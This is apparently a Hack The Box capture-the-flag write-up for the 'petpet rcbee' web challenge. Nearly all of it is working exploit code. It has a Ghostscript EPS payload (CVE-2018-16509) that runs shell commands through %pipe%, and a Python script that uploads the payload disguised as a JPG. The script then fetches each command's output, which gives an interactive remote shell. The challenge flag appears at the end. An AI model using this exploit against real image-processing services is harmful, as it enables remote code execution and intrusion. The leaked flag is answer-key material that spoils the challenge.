---
layout: single
title: petpet rcbee [Web] - Hack The Box
excerpt: "ECSC Prep"
date: 2021-12-21
classes: wide
header:
  teaser: 
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Web Challenge
tags:  
  - PIL-RCE-Ghostscript
---

[PIL RCE Ghostscript](https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509)

## POC
```
% !PS-Adobe-3.0 EPSF-3.0
% % BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark / OutputFile ( %pipe%touch /tmp/got_rce ) currentdevice putdeviceprops
```


# Exploit 

```python
#!/usr/bin/python3
import requests
import random
import string
import os
os.system("clear")

def get_random_string(length):
    	# choose from all lowercase letter
    	letters = string.ascii_lowercase
 	result_str = ''.join(random.choice(letters) for i in range(length))
    	return result_str
	
def inject(cmd):
	output=get_random_string(32) 
	PAYLOAD="%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: -0 -0 100 100\n\nuserdict /setpagedevice undef\nsave\nlegal\n{ null restore } stopped { pop } if\n{ legal } stopped { pop } if\nrestore\nmark /OutputFile (%pipe%"+str(cmd)+"	  >> /app/application/static/petpets/"+output+") currentdevice putdeviceprops"
	file = {'file': ('inject.jpg', PAYLOAD)}
	getdata = requests.post(HOST+API, files=file)
	return output

HOST='http://138.68.174.27:32613/'
API='/api/upload'
ENDPOINT='/static/petpets/'


while 1:
	cmd=input("> ")
	if cmd=="exit":
		break
	os.system("clear")
	print("[*] Trigger the command!")
	req=requests.get(HOST+ENDPOINT+inject(str(cmd)))
	print(req.text)
```


### Flag => HTB{c0mfy_bzzzzz_rcb33s_v1b3s}
